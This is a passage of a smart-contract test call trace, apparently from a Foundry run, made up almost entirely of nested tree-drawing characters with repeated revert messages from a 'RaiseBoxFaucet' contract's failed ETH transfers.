    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   